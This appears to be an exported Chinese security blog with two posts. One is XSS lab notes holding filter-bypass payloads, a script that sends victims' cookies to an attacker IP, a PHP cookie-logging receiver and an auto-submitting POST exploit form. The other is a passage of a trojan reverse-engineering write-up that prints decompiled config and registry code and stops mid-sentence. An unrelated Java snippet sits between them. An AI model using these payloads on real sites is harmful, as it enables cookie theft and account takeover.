12345document.refererwindow.namelocationinnerHTMLdocument.write 闭合标签 1234'onclick=&quot;alert(1111)&quot;'onclick=&quot;alert('xss')&quot;&gt;'&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert('xss')&quot;&gt;&lt;a href=&quot;'&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;&gt;what do you see?&lt;/a&gt; 工具测试 自动化工具AWVS，APPscan，xray等大型工具，xssstrike 手工测试 实战过程：想要盗取别人的cookie信息的话有一个前提条件，就是你应该在别人触发你的xss攻击时，你的代码应该将收集hJkie信息发送给你的平台来接收，这样才获取到了数据 12&quot;&gt;&lt;script&gt;document.location ='http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie='+document.cookie;&lt;/script&gt; 这个ip192.168.0.15是黑客ip然后这里因为有点麻烦，我就直接在本机上操作了获取cookie的代码 1234567891011121314151617181920&lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';$link=connect();//这个是获取cookie的api页面if(isset($_GET['cookie'])){ $time=date('Y-m-d g:i:s'); $ipaddress=getenv ('REMOTE_ADDR'); $cookie=$_GET['cookie']; $referer=$_SERVER['HTTP_REFERER']; $useragent=$_SERVER['HTTP_USER_AGENT']; $query=&quot;insert cookies(time,ipaddress,cookie,referer,useragent) values('$time','$ipaddress','$cookie','$referer','$useragent')&quot;; $result=mysqli_query($link, $query);}header(&quot;Location:http://192.168.1.4/pikachu/index.php&quot;);//重定向到一个可信的网站?&gt; 控制台 1location.href='www.baidu.com'; 给某个网址发请求，跳转到网址 1document.cookie 1location.href='http:jd.com?cookie='document.cookie; 黑客的主机跑网站 xss的post获取cookie登录 1234567891011121314151617181920212223242526&lt;html&gt;&lt;head&gt;&lt;script&gt;window.onload = function() { document.getElementById(&quot;postsubmit&quot;).click();}&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;&gt; &lt;input id=&quot;xssr_in&quot; type=&quot;text&quot; name=&quot;message&quot; value= &quot;&lt;script&gt;document.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie; &lt;/script&gt;&quot; /&gt; &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;window.onload = function() { document.getElementById(&quot;postsubmit&quot;).click();} onload当浏览器加载完页面所有内容后自动触发执行 12345678910111213141516171819202122232425import java.text.SimpleDateFormat;import java.util.Date;import java.util.Scanner;public class SimpleTimeConverter { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.print(&quot;请输入13位的毫秒数: &quot;); long milliseconds = scanner.nextLong(); // 创建Date对象 Date date = new Date(milliseconds); // 创建时间格式化对象（24小时制） SimpleDateFormat sdf = new SimpleDateFormat(&quot;HH:mm:ss&quot;); // 格式化时间 String timeString = sdf.format(date); System.out.println(&quot;24小时制时间: &quot; + timeString); scanner.close(); }} 一打开就访问漏洞代码 level1用后端语言php渲染html标签 1http://xss:4556/level1.php?name=&lt;a href=&quot;http://baidu.com&quot;&gt;db&lt;/a&gt; 直接 1&lt;script&gt;alert()&lt;/script&gt; level2对进行了base64 1window['alert'](&quot;先抱真帅&quot;) 页面源代码 尝试闭合构造新语句 1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt; level31' onfocus=javascript:alert() ' onfocus事件在元素获得焦点时触发，最常与&lt;input&gt;、&lt;select&gt; 和 &lt;a&gt; 标签一起使用，以上面图片的html标签&lt;input&gt;为例，&lt;input&gt;标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码 level4 尝试用双引号闭合 1&quot; onfocus=javascript:alert() &quot; level5 1?keyword=&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot; level6 尝试大小写绕过 123&quot;&gt; &lt;a hRef=javascript:alert()&gt;x&lt;/a&gt; &lt;&quot;&quot; Onfocus=javascript:alert() &quot;&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot; level7双拼写绕过","link":"/2025/12/13/%E9%9D%B6%E5%9C%BA/"},{"title":"","text":"银狐木马样本深度分析与后门域名溯源 由于制做C2工具的黑客留下了后门，所以这个木马是有后门的，你能找到它的后门吗 WriteUpwmain函数 123456789101112131415161718__int64 wmain(){ HWND hWnd; // rax DWORD idThread; // eax SetUnhandledExceptionFilter(TopLevelExceptionFilter); hWnd = GetConsoleWindow(); ShowWindow(hWnd, 0); idThread = GetCurrentThreadId(); PostThreadMessageA(idThread, 0, 0, 0); GetInputState(); sub_140008750(); hObject = CreateThread(0, 0, sub_14000A440, 0, 0, 0); WaitForSingleObject(hObject, 0xFFFFFFFF); CloseHandle(hObject); Sleep(0x12Cu); return 0;} 先看sub_140008750函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739#sub_140008750函数int sub_140008750(){ _UNKNOWN **v0; // rax __int64 v1; // rbx int v2; // eax int v3; // r9d __int64 v4; // rdx int v5; // r10d __int64 i; // r8 int v7; // ecx __int64 v8; // rbx int v9; // eax int v10; // r9d __int64 v11; // rdx int v12; // r10d __int64 j; // r8 int v14; // ecx __int64 v15; // rbx int v16; // eax int v17; // r9d __int64 v18; // rdx int v19; // r10d __int64 k; // r8 int v21; // ecx __int64 v22; // rbx int v23; // eax int v24; // r9d __int64 v25; // rdx int v26; // r10d __int64 m; // r8 int v28; // ecx __int64 v29; // rbx int v30; // eax int v31; // r9d __int64 v32; // rdx int v33; // r10d __int64 n; // r8 int v35; // ecx __int64 v36; // rbx int v37; // eax int v38; // r9d __int64 v39; // rdx int v40; // r10d __int64 ii; // r8 int v42; // ecx __int64 v43; // rbx int v44; // eax int v45; // r9d __int64 v46; // rdx int v47; // r10d __int64 jj; // r8 int v49; // ecx __int64 v50; // rbx int v51; // eax int v52; // r9d __int64 v53; // rdx int v54; // r10d __int64 kk; // r8 int v56; // ecx __int64 v57; // rbx int v58; // eax int v59; // r9d __int64 v60; // rdx int v61; // r10d __int64 mm; // r8 int v63; // ecx __int64 v64; // rbx int v65; // eax int v66; // r9d __int64 v67; // rdx int v68; // r10d __int64 nn; // r8 int v70; // ecx __int64 v71; // rbx int v72; // eax int v73; // r9d __int64 v74; // rdx int v75; // r10d __int64 i1; // r8 int v77; // ecx __int64 v78; // rbx int v79; // eax int v80; // r9d __int64 v81; // rdx int v82; // r10d __int64 i2; // r8 __int64 v84; // rbx int v85; // eax int v86; // r9d __int64 v87; // rdx int v88; // r10d __int64 i3; // r8 int v90; // ecx int v91; // ecx __int64 v92; // rbx int v93; // r9d __int64 v94; // rdx __int64 v95; // rsi int v96; // r10d __int64 v97; // r8 int v98; // ecx _UNKNOWN *retaddr; // [rsp+68h] [rbp+0h] BYREF DWORD cbData; // [rsp+70h] [rbp+8h] BYREF DWORD Type; // [rsp+78h] [rbp+10h] BYREF HKEY hKey; // [rsp+80h] [rbp+18h] BYREF v0 = &amp;retaddr; if ( !byte_140060708 ) { byte_140060708 = 1; wcsrev(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; memset(&amp;Src, 0, 0x12A0u); sub_140008620(L&quot;p1:&quot;, &amp;Source); sub_140008620(L&quot;o1:&quot;, &amp;Source__1); v1 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v2 = lstrlenW(L&quot;t1:&quot;); v3 = 0; v4 = 0; if ( (int)v1 &gt; 0 ) { while ( 1 ) { v5 = 0; for ( i = 0; i &lt; v2; ++v5 ) { if ( a0Db0Lk0Hs0Ld0L[v4 + i] != aT1[i] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i; } if ( v5 == v2 ) { v4 += v2; v3 += v2; if ( v4 &lt; v1 ) break; }LABEL_10: ++v4; ++v3; if ( v4 &gt;= v1 ) goto LABEL_15; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v4] != 124 ) { ++v4; ++v3; if ( v4 &gt;= v1 ) goto LABEL_10; } v7 = dword_14005F6A8; if ( a0Db0Lk0Hs0Ld0L[v3 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v7 = 1; dword_14005F6A8 = v7; }LABEL_15: sub_140008620(L&quot;p2:&quot;, &amp;Source_); sub_140008620(L&quot;o2:&quot;, &amp;Source__0); v8 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v9 = lstrlenW(L&quot;t2:&quot;); v10 = 0; v11 = 0; if ( (int)v8 &gt; 0 ) { while ( 1 ) { v12 = 0; for ( j = 0; j &lt; v9; ++v12 ) { if ( a0Db0Lk0Hs0Ld0L[v11 + j] != aT2[j] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++j; } if ( v12 == v9 ) { v11 += v9; v10 += v9; if ( v11 &lt; v8 ) break; }LABEL_23: ++v11; ++v10; if ( v11 &gt;= v8 ) goto LABEL_28; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v11] != 124 ) { ++v11; ++v10; if ( v11 &gt;= v8 ) goto LABEL_23; } v14 = dword_14005F8E8; if ( a0Db0Lk0Hs0Ld0L[v10 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v14 = 1; dword_14005F8E8 = v14; }LABEL_28: sub_140008620(L&quot;p3:&quot;, &amp;Source__2); sub_140008620(L&quot;o3:&quot;, &amp;Source__3); v15 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v16 = lstrlenW(L&quot;t3:&quot;); v17 = 0; v18 = 0; if ( (int)v15 &gt; 0 ) { while ( 1 ) { v19 = 0; for ( k = 0; k &lt; v16; ++v19 ) { if ( a0Db0Lk0Hs0Ld0L[v18 + k] != aT3[k] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++k; } if ( v19 == v16 ) { v18 += v16; v17 += v16; if ( v18 &lt; v15 ) break; }LABEL_36: ++v18; ++v17; if ( v18 &gt;= v15 ) goto LABEL_41; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v18] != 124 ) { ++v18; ++v17; if ( v18 &gt;= v15 ) goto LABEL_36; } v21 = dword_14005FB28; if ( a0Db0Lk0Hs0Ld0L[v17 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v21 = 1; dword_14005FB28 = v21; }LABEL_41: sub_140008620(L&quot;dd:&quot;, &amp;Destination__0); sub_140008620(L&quot;cl:&quot;, &amp;Destination__1); sub_140008620(L&quot;fz:&quot;, &amp;unk_14005FBA4); sub_140008620(L&quot;bb:&quot;, &amp;unk_14005FC08); sub_140008620(L&quot;bz:&quot;, &amp;unk_14005FC6C); v22 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v23 = lstrlenW(L&quot;jp:&quot;); v24 = 0; v25 = 0; if ( (int)v22 &gt; 0 ) { while ( 1 ) { v26 = 0; for ( m = 0; m &lt; v23; ++v26 ) { if ( a0Db0Lk0Hs0Ld0L[v25 + m] != aJp[m] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++m; } if ( v26 == v23 ) { v25 += v23; v24 += v23; if ( v25 &lt; v22 ) break; }LABEL_49: ++v25; ++v24; if ( v25 &gt;= v22 ) goto LABEL_54; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v25] != 124 ) { ++v25; ++v24; if ( v25 &gt;= v22 ) goto LABEL_49; } v28 = dword_14005FCD0; if ( a0Db0Lk0Hs0Ld0L[v24 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v28 = 1; dword_14005FCD0 = v28; }LABEL_54: v29 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v30 = lstrlenW(L&quot;sx:&quot;); v31 = 0; v32 = 0; if ( (int)v29 &gt; 0 ) { while ( 1 ) { v33 = 0; for ( n = 0; n &lt; v30; ++v33 ) { if ( a0Db0Lk0Hs0Ld0L[v32 + n] != aSx[n] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++n; } if ( v33 == v30 ) { v32 += v30; v31 += v30; if ( v32 &lt; v29 ) break; }LABEL_62: ++v32; ++v31; if ( v32 &gt;= v29 ) goto LABEL_67; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v32] != 124 ) { ++v32; ++v31; if ( v32 &gt;= v29 ) goto LABEL_62; } v35 = dword_14005FCD4; if ( a0Db0Lk0Hs0Ld0L[v31 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v35 = 1; dword_14005FCD4 = v35; }LABEL_67: v36 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v37 = lstrlenW(L&quot;bh:&quot;); v38 = 0; v39 = 0; if ( (int)v36 &gt; 0 ) { while ( 1 ) { v40 = 0; for ( ii = 0; ii &lt; v37; ++v40 ) { if ( a0Db0Lk0Hs0Ld0L[v39 + ii] != aBh[ii] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++ii; } if ( v40 == v37 ) { v39 += v37; v38 += v37; if ( v39 &lt; v36 ) break; }LABEL_75: ++v39; ++v38; if ( v39 &gt;= v36 ) goto LABEL_80; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v39] != 124 ) { ++v39; ++v38; if ( v39 &gt;= v36 ) goto LABEL_75; } v42 = dword_14005FCD8; if ( a0Db0Lk0Hs0Ld0L[v38 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v42 = 1; dword_14005FCD8 = v42; }LABEL_80: v43 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v44 = lstrlenW(L&quot;ll:&quot;); v45 = 0; v46 = 0; if ( (int)v43 &gt; 0 ) { while ( 1 ) { v47 = 0; for ( jj = 0; jj &lt; v44; ++v47 ) { if ( a0Db0Lk0Hs0Ld0L[v46 + jj] != aLl[jj] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++jj; } if ( v47 == v44 ) { v46 += v44; v45 += v44; if ( v46 &lt; v43 ) break; }LABEL_88: ++v46; ++v45; if ( v46 &gt;= v43 ) goto LABEL_93; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v46] != 124 ) { ++v46; ++v45; if ( v46 &gt;= v43 ) goto LABEL_88; } v49 = dword_14005FCDC; if ( a0Db0Lk0Hs0Ld0L[v45 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v49 = 1; dword_14005FCDC = v49; }LABEL_93: v50 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v51 = lstrlenW(L&quot;dl:&quot;); v52 = 0; v53 = 0; if ( (int)v50 &gt; 0 ) { while ( 1 ) { v54 = 0; for ( kk = 0; kk &lt; v51; ++v54 ) { if ( a0Db0Lk0Hs0Ld0L[v53 + kk] != aDl[kk] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++kk; } if ( v54 == v51 ) { v53 += v51; v52 += v51; if ( v53 &lt; v50 ) break; }LABEL_101: ++v53; ++v52; if ( v53 &gt;= v50 ) goto LABEL_106; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v53] != 124 ) { ++v53; ++v52; if ( v53 &gt;= v50 ) goto LABEL_101; } v56 = dword_14005FCE0; if ( a0Db0Lk0Hs0Ld0L[v52 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v56 = 1; dword_14005FCE0 = v56; }LABEL_106: v57 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v58 = lstrlenW(L&quot;sh:&quot;); v59 = 0; v60 = 0; if ( (int)v57 &gt; 0 ) { while ( 1 ) { v61 = 0; for ( mm = 0; mm &lt; v58; ++v61 ) { if ( a0Db0Lk0Hs0Ld0L[v60 + mm] != aSh[mm] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++mm; } if ( v61 == v58 ) { v60 += v58; v59 += v58; if ( v60 &lt; v57 ) break; }LABEL_114: ++v60; ++v59; if ( v60 &gt;= v57 ) goto LABEL_119; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v60] != 124 ) { ++v60; ++v59; if ( v60 &gt;= v57 ) goto LABEL_114; } v63 = dword_14005FCE4; if ( a0Db0Lk0Hs0Ld0L[v59 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v63 = 1; dword_14005FCE4 = v63; }LABEL_119: v64 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v65 = lstrlenW(L&quot;kl:&quot;); v66 = 0; v67 = 0; if ( (int)v64 &gt; 0 ) { while ( 1 ) { v68 = 0; for ( nn = 0; nn &lt; v65; ++v68 ) { if ( a0Db0Lk0Hs0Ld0L[v67 + nn] != aKl[nn] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++nn; } if ( v68 == v65 ) { v67 += v65; v66 += v65; if ( v67 &lt; v64 ) break; }LABEL_127: ++v67; ++v66; if ( v67 &gt;= v64 ) goto LABEL_132; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v67] != 124 ) { ++v67; ++v66; if ( v67 &gt;= v64 ) goto LABEL_127; } v70 = dword_14005FCE8; if ( a0Db0Lk0Hs0Ld0L[v66 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v70 = 1; dword_14005FCE8 = v70; }LABEL_132: v71 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v72 = lstrlenW(L&quot;bd:&quot;); v73 = 0; v74 = 0; if ( (int)v71 &gt; 0 ) { while ( 1 ) { v75 = 0; for ( i1 = 0; i1 &lt; v72; ++v75 ) { if ( a0Db0Lk0Hs0Ld0L[v74 + i1] != aBd[i1] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i1; } if ( v75 == v72 ) { v74 += v72; v73 += v72; if ( v74 &lt; v71 ) break; }LABEL_140: ++v74; ++v73; if ( v74 &gt;= v71 ) goto LABEL_145; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v74] != 124 ) { ++v74; ++v73; if ( v74 &gt;= v71 ) goto LABEL_140; } v77 = dword_14005FCEC; if ( a0Db0Lk0Hs0Ld0L[v73 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v77 = 1; dword_14005FCEC = v77; }LABEL_145: Type = 3; cbData = 0; LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey); if ( !(_DWORD)v0 ) LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData); if ( cbData &gt; 0xA ) { memset(a0Db0Lk0Hs0Ld0L, 0, 0x7D0u); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; sub_140008620(L&quot;p1:&quot;, &amp;Source); sub_140008620(L&quot;o1:&quot;, &amp;Source__1); v78 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v79 = lstrlenW(L&quot;t1:&quot;); v80 = 0; v81 = 0; if ( (int)v78 &gt; 0 ) { while ( 1 ) { v82 = 0; for ( i2 = 0; i2 &lt; v79; ++v82 ) { if ( a0Db0Lk0Hs0Ld0L[v81 + i2] != aT1[i2] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i2; } if ( v82 == v79 ) { v81 += v79; v80 += v79; if ( v81 &lt; v78 ) break; }LABEL_156: ++v81; ++v80; if ( v81 &gt;= v78 ) goto LABEL_157; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v81] != 124 ) { ++v81; ++v80; if ( v81 &gt;= v78 ) goto LABEL_156; } v90 = dword_14005F6A8; if ( a0Db0Lk0Hs0Ld0L[v80 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v90 = 1; dword_14005F6A8 = v90; }LABEL_157: sub_140008620(L&quot;p2:&quot;, &amp;Source_); sub_140008620(L&quot;o2:&quot;, &amp;Source__0); v84 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v85 = lstrlenW(L&quot;t2:&quot;); v86 = 0; v87 = 0; if ( (int)v84 &gt; 0 ) { while ( 1 ) { v88 = 0; for ( i3 = 0; i3 &lt; v85; ++v88 ) { if ( a0Db0Lk0Hs0Ld0L[v87 + i3] != aT2[i3] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i3; } if ( v88 == v85 ) { v87 += v85; v86 += v85; if ( v87 &lt; v84 ) break; }LABEL_165: ++v87; ++v86; if ( v87 &gt;= v84 ) goto LABEL_173; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v87] != 124 ) { ++v87; ++v86; if ( v87 &gt;= v84 ) goto LABEL_165; } v91 = dword_14005F8E8; if ( a0Db0Lk0Hs0Ld0L[v86 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v91 = 1; dword_14005F8E8 = v91; }LABEL_173: sub_140008620(L&quot;p3:&quot;, &amp;Source__2); sub_140008620(L&quot;o3:&quot;, &amp;Source__3); v92 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; LODWORD(v0) = lstrlenW(L&quot;t3:&quot;); v93 = 0; v94 = 0; v95 = (int)v0; if ( (int)v92 &gt; 0 ) { while ( 1 ) { v96 = 0; v97 = 0; if ( (int)v95 &gt; 0 ) { do { LODWORD(v0) = aT3[v97]; if ( a0Db0Lk0Hs0Ld0L[v94 + v97] != (_WORD)v0 )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++v97; ++v96; } while ( v97 &lt; v95 ); } if ( v96 == (_DWORD)v95 ) { v94 += v95; v93 += v95; if ( v94 &lt; v92 ) break; }LABEL_181: ++v94; ++v93; if ( v94 &gt;= v92 ) return (int)v0; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v94] != 124 ) { ++v94; ++v93; if ( v94 &gt;= v92 ) goto LABEL_181; } v98 = dword_14005FB28; LODWORD(v0) = v93; if ( a0Db0Lk0Hs0Ld0L[v93 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v98 = 1; dword_14005FB28 = v98; } } } return (int)v0;} 1.打开注册表键 (Open Key)这一行尝试打开 HKEY_CURRENT_USER\\Console 键： 1LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey); 2.第一次查询值 (Query Value - Get Size)如果打开成功，这一行查询 IpDate 值的数据大小 (cbData)，但不读取数据： 12if ( !(_DWORD)v0 ) LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData); 3.第二次查询值 (Query Value - Read Data) 如果第一次查询显示数据大小大于 0xA，则进入这段代码，这一行实际读取了 IpDate 的数据 到字符串 a0Db0Lk0Hs0Ld0L 中： 1RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// 